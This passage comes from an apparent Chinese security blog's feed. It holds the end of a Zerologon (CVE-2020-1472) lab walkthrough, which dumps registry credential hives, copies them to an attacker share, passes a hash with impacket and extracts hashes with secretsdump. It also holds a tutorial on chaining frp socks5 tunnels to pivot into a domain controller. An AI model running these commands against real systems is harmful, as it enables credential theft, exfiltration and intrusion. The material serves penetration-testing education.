class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\security security.hive</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/acaa94a386ea3d32f427090193558e16.png" alt="image-20220810153451987"></p><p>通过SMB share复制回攻击机</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\&gt;</span>copy sam.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>am.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>copy security.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>ecurity.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>copy system.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>ystem.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>exit</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/cc093d005f3aedfa5facda684b6cd700.png" alt="image-20220810153845364"></p><p>或者利用impacket-smbclient链接到smb将文件下载到本地。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">impacket</span>-smbclient redteam.red/administrator@<span class="number">10.10.10.8</span> -hashes :<span class="number">579</span>da<span class="number">618</span>cfbfa<span class="number">85247</span>acf<span class="number">1</span>f<span class="number">800</span>a<span class="number">280</span>a<span class="number">4</span></span><br><span class="line"><span class="comment"># use c$</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="comment"># get sam.hive</span></span><br><span class="line"><span class="comment"># get security.hive</span></span><br><span class="line"><span class="comment"># get system.hive</span></span><br><span class="line"><span class="comment"># exit</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/b905ef8ec45562a91c609ac83ae2d1d9.png" alt="image-20220810154730324"></p><p>利用secretsdump 读取到hash</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive  -<span class="keyword">system</span> <span class="keyword">system</span>.hive  -<span class="keyword">security</span> <span class="keyword">security</span>.hive <span class="keyword">LOCAL</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/2ae82be519b899cab986509040e36729.png" alt="image-20220810160422687"></p><p>利用reinstall_original_pw.py将密码恢复。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> reinstall_original_pw.py owa <span class="number">10.10.10.8</span> <span class="number">4</span>e<span class="number">4890</span>dbf<span class="number">2</span>da<span class="number">33</span>f<span class="number">3</span>ce<span class="number">4087</span>f<span class="number">5</span>dd<span class="number">6</span>a<span class="number">4</span>dba</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/29a737488a1edfa98f9ad7bc71775279.png" alt="image-20220810160619182"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00-目录&quot;&gt;&lt;a href=&quot;#0x00-目录&quot; class=&quot;headerlink&quot; title=&quot;# 0x00 目录&quot;&gt;&lt;/a&gt;# 0x00 目录&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;漏洞分析&lt;/li&gt;
&lt;li&gt;漏洞利用条件&lt;/li&gt;
&lt;li&gt;漏洞利用&lt;/li&gt;
</summary>
      
    
    
    
    
    <category term="CVE-2020-1472" scheme="https://z4ynadmin.github.io/tags/CVE-2020-1472/"/>
    
  </entry>
  
  <entry>
    <title>frp之一层网络代理 / 二层网络代理 / 三层网络代理</title>
    <link href="https://z4ynadmin.github.io/2022/11/04/frp%E4%B9%8B%E4%B8%80%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/"/>
    <id>https://z4ynadmin.github.io/2022/11/04/frp%E4%B9%8B%E4%B8%80%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/</id>
    <published>2022-11-04T03:05:00.000Z</published>
    <updated>2022-11-07T06:43:04.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="frp之一层网络代理-二层网络代理-三层网络代理"><a href="#frp之一层网络代理-二层网络代理-三层网络代理" class="headerlink" title="frp之一层网络代理 / 二层网络代理 / 三层网络代理"></a>frp之一层网络代理 / 二层网络代理 / 三层网络代理</h1><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9a8daaf9a97e19adb4eb2e2aed0f0724.png" alt="image-20221103155324246"></p><h3 id="一层网络代理"><a href="#一层网络代理" class="headerlink" title="# 一层网络代理"></a># 一层网络代理</h3><p>获取10.10.10.13 Web服务器权限后搭建frp扫描DMZ区内主机。</p><ol><li>使用VPS作为FRP服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>用Windows Server 2012作为客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向frp服务端绑定的端口</span></span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080             <span class="comment"># 代理所使用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理的类型</span></span><br></pre></td></tr></table></figure><ol start="3"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="4"><li>命令前加上proxychains4</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychinas4 ssh root@10.10.10.15</span><br></pre></td></tr></table></figure><hr><h3 id="二层网络代理"><a href="#二层网络代理" class="headerlink" title="# 二层网络代理"></a># 二层网络代理</h3><p>经过在DMZ区的信息收集发现还有一个网段为192.168.30.0/24的办公区网段，利用frp在DMZ区与办公区搭建一个socks5代理。</p><ol><li>使用VPS作为frp服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Windows Server 2012 上起一个frp客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 10.10.10.13         <span class="comment"># 本地监听的ip地址</span></span><br><span class="line">local_port = 10808             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 1080             <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="3"><li>在Windows Server 2012 再起一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\frps.exe -c .\frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13    <span class="comment"># 在Windows Server 2012服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服Windows Server 2012服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在DMZ区的10.10.10.15 Ubuntu上执行</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.\frpc -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13      <span class="comment"># 指向Windows Server 2012 frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Windows Server 2012 frp服务端绑定的端口</span></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 10808            <span class="comment"># 代理所使用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理的类型</span></span><br></pre></td></tr></table></figure><ol start="5"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="6"><li>命令前加上proxychains4</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychinas4 rdesktop 192.168.30.20</span><br></pre></td></tr></table></figure><hr><h3 id="三层网络代理"><a href="#三层网络代理" class="headerlink" title="# 三层网络代理"></a># 三层网络代理</h3><p>通过代理访问到核心区的<strong>192.168.60.10域控制器</strong></p><ol><li>使用VPS作为frp服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在VPS上的FRP服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在VPS上的FRP服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Windows Server 2012 上执行以下命令：</li></ol><p>启动frp客户端，将本地端口10808转发到VPS的1080端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端配置文件frpc.ini的内容如下</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向VPS上frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向VPS上frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 10.10.10.13         <span class="comment"># 本地监听的ip地址</span></span><br><span class="line">local_port = 10808             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 1080             <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="3"><li>在Windows Server 2012 再起一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\frps.exe -c .\frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13    <span class="comment"># 在Windows Server 2012服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服Windows Server 2012服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在<strong>DMZ区</strong>的10.10.10.15 Ubuntu上执行，启动一个客户端</li></ol><p>启动frp客户端，链接上Web服务端，将本地10808端口转发到Windows Server 2012的10808端口上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13      <span class="comment"># 指向Windows Server 2012 frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Windows Server 2012 frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 192.168.30.40       <span class="comment"># 本地监听的IP地址</span></span><br><span class="line">local_port = 10809             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 10808            <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="5"><li>在DMZ区的10.10.10.15 Ubuntu上再启动一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.30.40      <span class="comment"># 指定frp服务器端ip地址</span></span><br><span class="line">bind_port = 7000               <span class="comment"># 指定frp服务端绑定端口</span></span><br></pre></td></tr></table></figure><ol start="6"><li>在办公区的文件服务器上执行</li></ol><p>启动frp客户端，链接Ubuntu的frp服务端，并在10809端口上启动socks5代理服务后，转发到Ubuntu服务器的10809端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.30.40    <span class="comment"># 指向Ubantu服务器上的 frp 服务端IP地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Ubantu服务器上的 frp 服务端端口</span></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 10809            <span class="comment"># 代理所用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理类型</span></span><br></pre></td></tr></table></figure><ol start="7"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="8"><li>命令前加上proxychains4</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychinas4</span> rdesktop <span class="number">192.168.60.10</span></span><br></pre></td></tr></table></figure><p>参考：《内网渗透体系建设》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;frp之一层网络代理-二层网络代理-三层网络代理&quot;&gt;&lt;a href=&quot;#frp之一层网络代理-二层网络代理-三层网络代理&quot; class=&quot;headerlink&quot; title=&quot;frp之一层网络代理 / 二层网络代理 / 三层网络代理&quot;&gt;&lt;/a&gt;frp之一层网络代理</summary>
      
    
    
    
    
    <category term="内网" scheme="https://z4ynadmin.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="代理" scheme="https://z4ynadmin.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
    <category term="frp" scheme="https://z4ynadmin.github.io/tags/frp/"/>
    
  </entry>
  
</feed>
